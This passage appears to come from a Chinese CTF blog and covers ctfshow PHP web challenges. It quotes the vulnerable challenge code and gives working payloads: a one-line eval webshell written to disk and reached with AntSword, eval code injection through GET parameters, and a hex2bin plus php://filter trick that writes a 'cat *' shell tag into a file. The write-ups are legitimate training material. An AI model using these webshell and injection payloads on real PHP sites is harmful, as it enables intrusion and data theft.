class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>array_push():在数组尾部插入元素</li>
<li>rand(i,j):在i到j范围内产生随机数，是整形数</li>
<li>in_array(<img src="https://g.yuque.com/gr/latex?a,#card=math&code=a%2C&id=ZmICx">b,[TRUE]):查找字符串<img src="https://g.yuque.com/gr/latex?a%E5%9C%A8%E6%95%B0%E7%BB%84#card=math&code=a%E5%9C%A8%E6%95%B0%E7%BB%84&id=GSz2F">b中是否有出现，有返回1，	无返回0</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662534043184-8b03d928-c20e-4e4d-a789-f78bac53c7eb.png#averageHue=%23f1f1f1&clientId=ube1b6a05-17c4-4&from=paste&height=535&id=u6cd96259&name=image.png&originHeight=669&originWidth=1071&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87307&status=done&style=none&taskId=u09ad7292-fd8e-45c0-8103-fcf36b085c1&title=&width=856.8" alt="image.png"><br>这个函数有个漏洞，没有设置第三个参数 就可以形成自动转换如:n&#x3D;1.php自动转换为1</p>
<p>所以这一题的payload很简单：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662534062585-925eda4d-627a-4fab-9732-6a53083b6261.png#averageHue=%23f8f8f8&clientId=ube1b6a05-17c4-4&from=paste&height=221&id=uf701c74f&name=image.png&originHeight=276&originWidth=875&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49562&status=done&style=none&taskId=udc5a40f2-49bd-48a0-9146-bbe3a695714&title=&width=700" alt="image.png"><br>n传入数字.php，数字在1到877之间即可，然后post传递content写入一句话木马进去，最后用蚁剑连接就好<br>payload2：在content内写入system(‘ls’),找到flag文件，最后读取即可</p>
<h2 id="PHP（测试题）"><a href="#PHP（测试题）" class="headerlink" title="PHP（测试题）"></a>PHP（测试题）</h2><p>下面为代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>  (<span class="string">&quot;POST&quot;</span> == <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]) <span class="comment">//需要POST传参</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$DeadHeat</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;DeadHeat&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, <span class="variable">$DeadHeat</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Big Pig&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">TRUE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$reg</span> = <span class="string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$reg</span>, <span class="variable">$DeadHeat</span>, <span class="variable">$arr</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$ps</span> = <span class="keyword">array</span>(<span class="string">&#x27;punct&#x27;</span>, <span class="string">&#x27;digit&#x27;</span>, <span class="string">&#x27;upper&#x27;</span>, <span class="string">&#x27;lower&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ps</span> <span class="keyword">as</span> <span class="variable">$pt</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[[:<span class="subst">$pt</span>:]]+/&quot;</span>, <span class="variable">$DeadHeat</span>))</span><br><span class="line">            <span class="variable">$c</span> += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$c</span> &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;42&quot;</span> == <span class="variable">$DeadHeat</span>) <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&#x27;So clever that DeadHeat is laughing at you&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先，我们先把一些陌生的东西列下来：</p>
<blockquote>
<p>[:graph:] : 除空格，TAB外的所有字符<br>[:punct:] : 任何标点符号<br>[:digit:] : 任何数字<br>[:upper:] : 任何大写字母<br>[:lower:] : 任何小写字母</p>
</blockquote>
<p>这些都是正则表达式，我们首先看第一个判断if (0 &gt;&#x3D; preg_match(‘&#x2F;^[[:graph:]]{12,}$&#x2F;‘, $DeadHeat))<br>这些都是正则表达式，我们首先看第一个判断if (0 &gt;&#x3D; preg_match(‘&#x2F;^[[:graph:]]{12,}$&#x2F;‘, $DeadHeat))<br>post传入一个参数Deadheat，<strong>然后这个deadheat至少要有12个可打印字符，也就是长度至少为12</strong></p>
<p>第二个判断：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reg</span> = <span class="string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$reg</span>, <span class="variable">$DeadHeat</span>, <span class="variable">$arr</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>preg_match_all:查询目标字符在字符串中出现的次数</li>
</ul>
<p>这个判断的意思是，输入的DeadHeat可以识别出类型有六种，如：123ABabc<br>假如输入以上参数，返回值将是3<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662534492569-0abd3881-98fb-4488-881d-09be75c279fc.png#averageHue=%23fdfcfc&clientId=ube1b6a05-17c4-4&from=paste&height=105&id=uca1bb2e4&name=image.png&originHeight=131&originWidth=1100&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17124&status=done&style=none&taskId=u18e8ecf2-63c7-47b9-bebb-f681f332029&title=&width=880" alt="image.png"><br>他有大写，小写，数字;如果是这样asdasdasda，那么只有1<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662534520479-4ef2042a-6853-4143-a6d1-e90ddd2243bb.png#averageHue=%23fefdfd&clientId=ube1b6a05-17c4-4&from=paste&height=215&id=u7754cf6e&name=image.png&originHeight=269&originWidth=1213&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17790&status=done&style=none&taskId=u956d32ea-f5e6-43a2-9d51-6148f306add&title=&width=970.4" alt="image.png"><br>所以这一个判断的意思是，要可以识别六种或者六种以上的种类（数字，符号，大小写字母)</p>
<p>第三个判断:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line">       <span class="variable">$ps</span> = <span class="keyword">array</span>(<span class="string">&#x27;punct&#x27;</span>, <span class="string">&#x27;digit&#x27;</span>, <span class="string">&#x27;upper&#x27;</span>, <span class="string">&#x27;lower&#x27;</span>);</span><br><span class="line">       <span class="keyword">foreach</span> (<span class="variable">$ps</span> <span class="keyword">as</span> <span class="variable">$pt</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[[:<span class="subst">$pt</span>:]]+/&quot;</span>, <span class="variable">$DeadHeat</span>))</span><br><span class="line">           <span class="variable">$c</span> += <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$c</span> &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">if</span> (<span class="string">&quot;42&quot;</span> == <span class="variable">$DeadHeat</span>) <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<p>和上面的原理是一样的，用foreach遍历，意思是输入的DeanHeat里至少有**’punct’, ‘digit’, ‘upper’, ‘lower’<strong>当中的三种类型<br>最后如果”42” &#x3D;&#x3D; $DeadHeat，就输出flag，这里是一个弱类型，我们直接用科学计数法来搞<br>payload(post方式) :DeadHeat&#x3D;42.000e-00000000<br>这里输入的一共</strong>长度为16满足条件一**,可以被<strong>识别出6次，满足条件二</strong>,有<strong>三种类型，满足条件三</strong></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662534539932-77acc975-63fd-4256-a0dc-fe416f327c07.png#averageHue=%23c3ae92&clientId=ube1b6a05-17c4-4&from=paste&height=813&id=ub252fe88&name=image.png&originHeight=1016&originWidth=1168&originalType=binary&ratio=1&rotation=0&showTitle=false&size=139958&status=done&style=none&taskId=ub8f55e0c-f09c-46ba-a203-4634cc6fea1&title=&width=934.4" alt="image.png"></p>
<h2 id="Web100（运算符优先级和eval的利用）"><a href="#Web100（运算符优先级和eval的利用）" class="headerlink" title="Web100（运算符优先级和eval的利用）"></a>Web100（运算符优先级和eval的利用）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>首先先看第一个<code>_if_($v0)</code><em>:</em><br>由于赋值运算符的优先级更高，所以意思就是$v0&#x3D;is_numeric($v1)<br>意思就是$v1要是一个数字，我们v1随便传一个数字上去就好</p>
<p>第二个判断和第三个判断：<br>要求v2里面不能有;分号，要求v3里面必须有分号；（所以这里不能用；隔开执行多条指令）</p>
<p>构造payload：<br>?v1&#x3D;1&amp;v2&#x3D;?&gt;&amp;v3&#x3D;<?php eval($_POST[1])?>;<br>具体为什么这样做，在命令执行Web72中在笔记中，已经阐述了关于eval的一些潜规则，可以把eval当做默认有<?php和?><br>这边由于v3要求有；所以我才加了个，不加也是符合规则的</p>
<p>payload2：<br>?v1&#x3D;1&amp;v2&#x3D;eval($_POST[1])?&gt;#&amp;v3&#x3D;1；<br>这边#要URL编码一下，因为URL中#是有特殊含义的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662541540150-92157944-53f2-4592-a03d-2fa2b1139a6d.png#averageHue=%23fefdfd&clientId=ube1b6a05-17c4-4&from=paste&height=269&id=uae9a21ba&name=image.png&originHeight=336&originWidth=799&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84276&status=done&style=none&taskId=u797cf9d7-774d-4094-91ac-3829cf23499&title=&width=639.2" alt="image.png"></p>
<h2 id="Web101（反射类利用）"><a href="#Web101（反射类利用）" class="headerlink" title="Web101（反射类利用）"></a>Web101（反射类利用）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先分析一下，第一层if还是老样子，和上一题一样</p>
<p>第二层和第三层if就变了，这次不能用上一题的方法，因为很多特殊符号被ban了：<br>这里注意一下，**v3中仍然可以用;<br>**这里用到反射类，什么是反射类呢：<br>参考本篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/gdfjhc/article/details/83904891?app_version=5.7.5&code=app_1562916241&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%2283904891%22,%22source%22:%22qq_27212359%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app">php反射类 ReflectionClass_运真表姐的博客-CSDN博客</a><br>参考一下数据：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;123123123&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  PI=<span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getConstants</span>());  获取一组常量</span><br><span class="line">输出</span><br><span class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;PI&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">float</span>(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getName</span>());    获取类名</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getStaticProperties</span>()); 获取静态属性</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;flag&#123;123123123&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getMethods</span>()); 获取类中的方法</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;hello&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>所以payload：<br>?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;<br>eval结尾要有分号嘛，所以v3是；<br>得到以下结果：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662543843706-f2411106-a3a4-4f3b-a0ac-185b84f2e1e4.png#averageHue=%23ededed&clientId=ube1b6a05-17c4-4&from=paste&height=53&id=u84a6325e&name=image.png&originHeight=66&originWidth=1527&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26756&status=done&style=none&taskId=ub25eb910-9ac5-41c1-baa4-1c1ae3d3613&title=&width=1221.6" alt="image.png"><br>可以看到flag在这行字符串中：74458f870x2d4b470x2d44bd0x2d8e800x2da2080f95365<br>其中<code>0x2d</code>化成十进制为<code>45</code>对应ascii码中的<code>-</code>,替换一下得到<br>flag应该是<code>ctshow&#123;74458f87-4b47-44bd-8e80-a2080f95365?&#125;</code><br>注意结尾的那个？那是不确定是什么，仔细数一下最后一个-后面的数字，只有11个<br>ctfshow上题目最后一排数字应该是12个数字，这里需要用burpsuite爆破一下（0-9，a-z)<br>抓包爆破，这里就不用intruduct了，就repeater里面一个个试着吧，爆破反应太快，会崩溃</p>
<p>最后尝试到0，发现correct，结束</p>
<h2 id="Web102（进制转换-伪协议利用）"><a href="#Web102（进制转换-伪协议利用）" class="headerlink" title="Web102（进制转换+伪协议利用）"></a>Web102（进制转换+伪协议利用）</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$<span class="attribute">v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$<span class="attribute">v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$<span class="attribute">v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$<span class="attribute">v4</span> = is_numeric(<span class="variable">$v2</span>) and is_numeric(<span class="variable">$v3</span>);</span><br><span class="line">if($v4)&#123;</span><br><span class="line">    $<span class="attribute">s</span> = substr(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    $<span class="attribute">str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="attribute">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到这题有个file_put_contents，我就想到了杂糅代码(sry,PTSD?)，就结果而言还是有点关系的好吧</p>
<p>首先一步步分析：<br>第一个判断的if和之前几题一样，赋值运算符的优先级更高，所以v2必须是个可以识别出的数字</p>
<p>第二步：$s是把v2从第二位开始裁取，然后$str用了个<code>call_user_func</code>函数</p>
<ul>
<li>call_user_func：把第一个参数作为回调函数调用</li>
</ul>
<p>一句话来概括就是，call_user_func（$a,$b)&#x3D;$a($b)<br><strong>所以这边v1输入的肯定是个函数，然后$s就是函数的参数了</strong><br>最后输出$str的结果，再把结果放进v3中，v3肯定是个文件名</p>
<ul>
<li>is_number在PHP5是可以识别十六进制的字符的，但是这一题环境是PHP7，所以不能用有e以外的字母的十六进制数字（可以被识别成科学计数法），而且字母数也只能为1。</li>
<li>bin2hex:十六进制加密</li>
<li>hex2bin:十六进制解密</li>
</ul>
<p>所以思路是，传入先构造一个指令，如<code>&lt;?=</code>cat *<code>;</code>意思是将当前目录所有文件和目录输出<br>将这个指令base64加密得到：<code>PD89YGNhdCAqYDs=</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662610147441-3336656a-c266-4311-8a91-f3f1d1a2b4b9.png#averageHue=%23353d47&clientId=u1d7201f2-64f4-4&from=paste&height=182&id=u3df1573d&name=image.png&originHeight=228&originWidth=421&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13474&status=done&style=none&taskId=u760e62d2-957e-4cc2-a8cd-8c917a69284&title=&width=336.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662610165279-1f1b8b37-30e3-4b3a-99d7-80b84018678c.png#averageHue=%23fdfcfc&clientId=u1d7201f2-64f4-4&from=paste&height=174&id=udc968ae5&name=image.png&originHeight=217&originWidth=750&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9111&status=done&style=none&taskId=ue50ba677-ee55-4a82-8e6e-16b8f082784&title=&width=600" alt="image.png"><br>之前也强调了，末尾的&#x3D;可以去除，这里假如不去除，用bin2hex加密成十六机制后，就会有2个字母出现<br>去掉&#x3D;后十六进制加密为：<code>5044383959474e6864434171594473</code><br>这里面只有一个字母e，可以被识别成数字，所以我们的payload：<br><code>?v2=125044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=flag.php</code><br>这里就用了filter伪协议的base64解码<br>这边注意v2，前面加了2个数字12，是因为substr从第二位开始截取<br>post传参：<code>v1=hex2bin</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662610105255-761b0d55-0cae-4fbb-987f-49f0d2a964ee.png#averageHue=%23797979&clientId=u1d7201f2-64f4-4&from=paste&height=597&id=u5ecd4b77&name=image.png&originHeight=746&originWidth=1829&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66575&status=done&style=none&taskId=u0ec0bdd5-712b-482e-aca0-6d049288cd9&title=&width=1463.2" alt="image.png"><br>传入之后再访问flag.php就能看到答案了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662614028852-cee1be77-9202-48a5-b49c-08b53e25507f.png#averageHue=%23fdfdfd&clientId=u380cfe35-3296-4&from=paste&height=415&id=u478f24b0&name=image.png&originHeight=519&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19471&status=done&style=none&taskId=uae344cf4-6707-43fa-a09f-b825d028509&title=&width=876.8" alt="image.png"></p>
<p>ps:这里别命名flag.php，貌似会被覆盖掉，第一遍出错了</p>
<h2 id="Web103"><a href="#Web103" class="headerlink" title="Web103"></a>Web103</h2><p>与Web102同解法</p>
<h2 id="Web104（若知题）"><a href="#Web104（若知题）" class="headerlink" title="Web104（若知题）"></a>Web104（若知题）</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $<span class="attribute">v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $<span class="attribute">v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    if(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        <span class="attribute">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>感觉好若知啊这一题，用了个sha1哈希加密，但是我传两个一样的数字不就行了吗<br>payload:?v2&#x3D;1<br>post:v1&#x3D;1</p>
